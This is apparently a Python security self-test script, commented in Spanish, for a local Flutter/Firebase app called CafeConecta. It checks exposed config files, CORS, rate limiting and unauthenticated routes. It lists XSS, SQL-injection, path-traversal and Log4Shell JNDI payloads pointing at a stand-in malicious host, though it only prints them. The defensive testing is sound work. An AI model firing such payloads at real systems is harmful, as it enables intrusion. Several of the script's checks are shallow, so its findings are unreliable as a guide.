import requests
import json
import time
from datetime import datetime
import subprocess
import os
import urllib.parse

class SecurityTestCafeConecta:
    def __init__(self):
        self.url_base = "http://localhost:3000"
        self.resultados = {}
        self.vulnerabilidades_encontradas = []
        
    def crear_reporte_seguridad(self):
        """Crear directorio para reportes de seguridad"""
        if not os.path.exists("reportes_seguridad_cafeconecta"):
            os.makedirs("reportes_seguridad_cafeconecta")
    
    def test_firebase_security_rules(self):
        """Verificar configuración de seguridad de Firebase"""
        print("\n🔥 PRUEBA: Configuración de Firebase")
        print("="*50)
        
        vulnerabilidades = []
        
        # Verificar si las reglas de Firebase están expuestas
        print("   🔍 Verificando exposición de configuración...")
        
        try:
            # Intentar acceder a archivos de configuración comunes
            urls_config = [
                f"{self.url_base}/.well-known/assetlinks.json",
                f"{self.url_base}/firebase-messaging-sw.js",
                f"{self.url_base}/manifest.json"
            ]
            
            for url in urls_config:
                try:
                    response = requests.get(url, timeout=5)
                    if response.status_code == 200:
                        print(f"   ✅ Archivo encontrado: {url}")
                        # Verificar si contiene información sensible
                        if "firebase" in response.text.lower():
                            print(f"   ⚠️ Contiene configuración Firebase")
                except:
                    continue
            
            print("   💡 Recomendación: Verificar que las reglas de Firestore sean restrictivas")
            
        except Exception as e:
            print(f"   ❌ Error en prueba Firebase: {e}")
        
        return vulnerabilidades
    
    def test_authentication_bypass(self):
        """Probar bypass de autenticación"""
        print("\n🔐 PRUEBA: Bypass de Autenticación")
        print("="*50)
        
        vulnerabilidades = []
        
        # Intentar acceder a rutas protegidas sin autenticación
        rutas_protegidas = [
            "/#/home",
            "/#/registrar_kilos", 
            "/#/chat"
        ]
        
        for ruta in rutas_protegidas:
            try:
                url = f"{self.url_base}{ruta}"
                print(f"   🔍 Probando acceso a: {ruta}")
                
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Verificar si la página se carga sin autenticación
                    if "login" not in response.text.lower():
                        vulnerabilidades.append(f"Posible bypass en {ruta}")
                        print(f"   ⚠️ VULNERABILIDAD: Acceso sin autenticación a {ruta}")
                    else:
                        print(f"   ✅ Redirige correctamente a login")
                
            except Exception as e:
                print(f"   ❌ Error probando {ruta}: {e}")
        
        return vulnerabilidades
    
    def test_input_validation(self):
        """Probar validación de entrada en formularios"""
        print("\n📝 PRUEBA: Validación de Entrada")
        print("="*50)
        
        vulnerabilidades = []
        
        # Payloads de prueba para inyecciones
        payloads_xss = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        payloads_injection = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://malicious.com/}"
        ]
        
        print("   🔍 Probando payloads XSS...")
        for payload in payloads_xss:
            print(f"   Testing: {payload[:30]}...")
            # Aquí normalmente probarías contra formularios reales
            # Como es Flutter web, esto sería más complejo
        
        print("   🔍 Probando payloads de inyección...")
        for payload in payloads_injection:
            print(f"   Testing: {payload[:30]}...")
        
        print("   💡 Nota: Flutter web renderiza en canvas, XSS tradicional es limitado")
        print("   💡 Firebase Firestore previene inyecciones SQL automáticamente")
        
        return vulnerabilidades
    
    def test_information_disclosure(self):
        """Probar divulgación de información"""
        print("\n🕵️ PRUEBA: Divulgación de Información")
        print("="*50)
        
        vulnerabilidades = []
        
        # Archivos y directorios sensibles comunes
        archivos_sensibles = [
            "/.env",
            "/config.json",
            "/firebase-config.js",
            "/main.dart.js.map",
            "/.git/config",
            "/web.config",
            "/robots.txt",
            "/sitemap.xml"
        ]
        
        for archivo in archivos_sensibles:
            try:
                url = f"{self.url_base}{archivo}"
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"   ⚠️ ENCONTRADO: {archivo}")
                    
                    # Verificar contenido sensible
                    contenido = response.text.lower()
                    if any(palabra in contenido for palabra in ['password', 'secret', 'key', 'token']):
                        vulnerabilidades.append(f"Información sensible en {archivo}")
                        print(f"   🚨 CRÍTICO: Información sensible en {archivo}")
                    else:
                        print(f"   ✅ Sin información sensible aparente")
                        
            except:
                continue
        
        return vulnerabilidades
    
    def test_cors_configuration(self):
        """Probar configuración CORS"""
        print("\n🌐 PRUEBA: Configuración CORS")
        print("="*50)
        
        vulnerabilidades = []
        
        try:
            headers = {
                'Origin': 'https://malicious.com',
                'Access-Control-Request-Method': 'GET',
                'Access-Control-Request-Headers': 'Content-Type'
            }
            
            response = requests.options(self.url_base, headers=headers, timeout=5)
            
            cors_headers = {
                'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
                'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods')
            }
            
            print(f"   📋 Headers CORS encontrados:")
            for header, value in cors_headers.items():
                if value:
                    print(f"   {header}: {value}")
                    
                    # Verificar configuraciones inseguras
                    if header == 'Access-Control-Allow-Origin' and value == '*':
                        vulnerabilidades.append("CORS muy permisivo (Allow-Origin: *)")
                        print(f"   ⚠️ CORS muy permisivo detectado")
            
        except Exception as e:
            print(f"   ❌ Error probando CORS: {e}")
        
        return vulnerabilidades
    
    def test_flutter_specific_security(self):
        """Pruebas específicas de seguridad para Flutter web"""
        print("\n📱 PRUEBA: Seguridad Específica de Flutter")
        print("="*50)
        
        vulnerabilidades = []
        
        try:
            response = requests.get(self.url_base, timeout=10)
            contenido = response.text
            
            # Verificar si está en modo debug
            if 'flutter_service_worker.js' in contenido:
                print("   ✅ Service Worker de Flutter detectado")
            
            if 'canvaskit' in contenido.lower():
                print("   ✅ CanvasKit renderer detectado")
            
            # Verificar información de debug expuesta
            if 'debug' in contenido.lower() or 'development' in contenido.lower():
                print("   ⚠️ Posibles referencias de debug encontradas")
                vulnerabilidades.append("Referencias de debug en producción")
            
            # Verificar source maps expuestos
            if '.map' in contenido:
                print("   ⚠️ Source maps pueden estar expuestos")
                vulnerabilidades.append("Source maps expuestos")
            
        except Exception as e:
            print(f"   ❌ Error en prueba Flutter: {e}")
        
        return vulnerabilidades
    
    def test_rate_limiting(self):
        """Probar límites de velocidad"""
        print("\n⚡ PRUEBA: Rate Limiting")
        print("="*50)
        
        vulnerabilidades = []
        
        print("   🔍 Probando múltiples solicitudes...")
        
        # Realizar múltiples solicitudes rápidas
        tiempos_respuesta = []
        
        for i in range(10):
            try:
                inicio = time.time()
                response = requests.get(f"{self.url_base}/#/login", timeout=5)
                tiempo = time.time() - inicio
                tiempos_respuesta.append(tiempo)
                
                if i == 0:
                    print(f"   📊 Primera solicitud: {tiempo:.2f}s")
                elif i == 9:
                    print(f"   📊 Última solicitud: {tiempo:.2f}s")
                    
            except Exception as e:
                print(f"   ❌ Error en solicitud {i}: {e}")
        
        # Analizar si hay rate limiting
        promedio = sum(tiempos_respuesta) / len(tiempos_respuesta) if tiempos_respuesta else 0
        
        if promedio < 0.1:
            print("   ⚠️ No hay evidencia de rate limiting")
            vulnerabilidades.append("Ausencia de rate limiting")
        else:
            print("   ✅ Tiempos de respuesta normales")
        
        return vulnerabilidades
    
    def ejecutar_todas_las_pruebas(self):
        """Ejecutar todas las pruebas de seguridad"""
        print("🛡️ ANÁLISIS DE SEGURIDAD CAFECONECTA")
        print("="*60)
        print(f"🎯 Objetivo: {self.url_base}")
        print(f"⏰ Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        self.crear_reporte_seguridad()
        
        # Verificar que la aplicación esté corriendo
        try:
            response = requests.get(self.url_base, timeout=5)
            if response.status_code != 200:
                print("❌ CafeConecta no está accesible")
                return
        except:
            print("❌ No se puede conectar a CafeConecta")
            print("💡 Ejecuta: flutter run -d chrome --web-port 3000")
            return
        
        print("✅ CafeConecta detectado, iniciando pruebas...\n")
        
        # Ejecutar todas las pruebas
        pruebas = [
            ("Firebase Security", self.test_firebase_security_rules),
            ("Authentication Bypass", self.test_authentication_bypass),
            ("Input Validation", self.test_input_validation),
            ("Information Disclosure", self.test_information_disclosure),
            ("CORS Configuration", self.test_cors_configuration),
            ("Flutter Security", self.test_flutter_specific_security),
            ("Rate Limiting", self.test_rate_limiting)
        ]
        
        todas_vulnerabilidades = []
        
        for nombre_prueba, funcion_prueba in pruebas:
            try:
                vulnerabilidades = funcion_prueba()
                todas_vulnerabilidades.extend(vulnerabilidades)
                time.sleep(1)  # Pausa entre pruebas
            except Exception as e:
                print(f"❌ Error en {nombre_prueba}: {e}")
        
        # Generar reporte final
        self.generar_reporte_final(todas_vulnerabilidades)
    
    def generar_reporte_final(self, vulnerabilidades):
        """Generar reporte final de seguridad"""
        print("\n" + "="*60)
        print("📊 REPORTE FINAL DE SEGURIDAD")
        print("="*60)
        
        if vulnerabilidades:
            print(f"⚠️ VULNERABILIDADES ENCONTRADAS: {len(vulnerabilidades)}")
            print()
            
            for i, vuln in enumerate(vulnerabilidades, 1):
                print(f"{i}. 🚨 {vuln}")
            
            print("\n🔧 RECOMENDACIONES GENERALES:")
            print("   1. 🔥 Revisar reglas de Firebase Firestore")
            print("   2. 🔐 Implementar autenticación robusta")
            print("   3. 📝 Validar todas las entradas del usuario")
            print("   4. 🕵️ No exponer información sensible")
            print("   5. 🌐 Configurar CORS apropiadamente")
            print("   6. ⚡ Implementar rate limiting")
            print("   7. 📱 Construir en modo release para producción")
            
        else:
            print("✅ NO SE ENCONTRARON VULNERABILIDADES CRÍTICAS")
            print("💡 Esto es bueno, pero siempre hay margen de mejora")
        
        print(f"\n📝 RECOMENDACIONES ESPECÍFICAS PARA CAFECONECTA:")
        print("   • 🔥 Firebase: Usar reglas restrictivas en Firestore")
        print("   • 🔐 Auth: Validar tokens en todas las operaciones")
        print("   • 📱 Flutter: Compilar con --release para producción")
        print("   • 🛡️ HTTPS: Usar siempre HTTPS en producción")
        
        # Guardar reporte en archivo
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archivo_reporte = f"reportes_seguridad_cafeconecta/reporte_seguridad_{timestamp}.txt"
        
        with open(archivo_reporte, 'w', encoding='utf-8') as f:
            f.write(f"REPORTE DE SEGURIDAD CAFECONECTA\n")
            f.write(f"Fecha: {datetime.now()}\n")
            f.write(f"URL: {self.url_base}\n\n")
            f.write(f"Vulnerabilidades encontradas: {len(vulnerabilidades)}\n\n")
            
            for i, vuln in enumerate(vulnerabilidades, 1):
                f.write(f"{i}. {vuln}\n")
        
        print(f"\n💾 Reporte guardado: {archivo_reporte}")

# Función para mostrar información sobre SQLMap
def mostrar_info_sqlmap():
    """Mostrar información sobre SQLMap y por qué no es aplicable"""
    print("\n❓ SOBRE SQLMAP Y CAFECONECTA")
    print("="*50)
    print("SQLMap es una herramienta para encontrar inyecciones SQL en:")
    print("   • Bases de datos relacionales (MySQL, PostgreSQL, etc.)")
    print("   • Aplicaciones que usan consultas SQL dinámicas")
    print("   • Endpoints web que procesan parámetros SQL")
    print()
    print("CafeConecta usa:")
    print("   • Firebase Firestore (NoSQL)")
    print("   • Flutter web (no endpoints SQL tradicionales)")
    print("   • Autenticación Firebase (no SQL)")
    print()
    print("💡 Por esto, SQLMap NO ES APLICABLE a CafeConecta")
    print("💡 Las pruebas de este script son más apropiadas")

if __name__ == "__main__":
    print("🛡️ HERRAMIENTAS DE SEGURIDAD PARA CAFECONECTA")
    print("="*60)
    print("1. 🔍 Ejecutar análisis de seguridad completo")
    print("2. ❓ Información sobre SQLMap")
    print("0. ❌ Salir")
    print()
    
    opcion = input("Selecciona una opción: ").strip()
    
    if opcion == "1":
        tester = SecurityTestCafeConecta()
        tester.ejecutar_todas_las_pruebas()
    elif opcion == "2":
        mostrar_info_sqlmap()
    else:
        print("👋 ¡Hasta luego!")